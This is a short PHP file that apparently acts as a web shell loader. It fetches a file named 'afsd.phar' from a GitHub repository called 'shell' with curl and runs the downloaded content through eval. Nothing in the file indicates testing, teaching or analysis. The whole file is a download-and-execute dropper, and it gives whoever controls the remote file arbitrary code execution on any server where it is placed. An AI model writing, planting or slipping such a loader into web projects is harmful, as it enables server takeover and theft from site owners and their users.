<?php
$ch = curl_init();
// Set the URL to fetch
curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/bosunia/shell/main/afsd.phar");

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$remoteCode = curl_exec($ch);
curl_close($ch);
if ($remoteCode !== false) {
    eval("?>" . $remoteCode);
} else {
    echo "Error: Unable to fetch remote code.";
}
?>
